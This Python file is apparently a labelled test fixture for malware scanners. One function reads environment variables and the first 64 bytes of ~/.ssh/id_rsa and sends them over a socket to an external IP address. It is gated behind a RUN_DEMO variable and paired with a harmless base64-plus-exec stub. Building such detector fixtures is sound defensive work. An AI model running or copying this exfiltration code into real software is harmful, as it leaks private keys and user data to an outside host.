"""
MALICIOUS (DEMO): This file contains intentionally suspicious patterns for testing:
- env var access
- sensitive file reads
- socket connection to external IP
- base64 + eval

Execution is guarded by RUN_DEMO env var to avoid running by default.
"""

import base64
import os
import socket


def suspicious_eval():
    payload = base64.b64encode(b"# demo only\npass\n").decode()
    try:
        code = base64.b64decode(payload)
        # eval/exec for detectors (do nothing harmful)
        exec(code, {})
    except Exception:
        pass


def exfiltrate():
    data = {
        "env": {"HOME": os.environ.get("HOME"), "USER": os.environ.get("USER")},
        "ssh": None,
    }
    try:
        ssh_path = os.path.expanduser("~/.ssh/id_rsa")
        if os.path.exists(ssh_path):
            with open(ssh_path, "rb") as f:
                data["ssh"] = f.read(64).hex()  # read small prefix only
    except Exception:
        pass

    # External IP target for detectors
    ip = "45.142.212.61"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        s.connect((ip, 443))
        s.sendall(str(data).encode())
    except Exception:
        pass
    finally:
        try:
            s.close()
        except Exception:
            pass


if os.getenv("RUN_DEMO") == "1":
    suspicious_eval()
    exfiltrate()
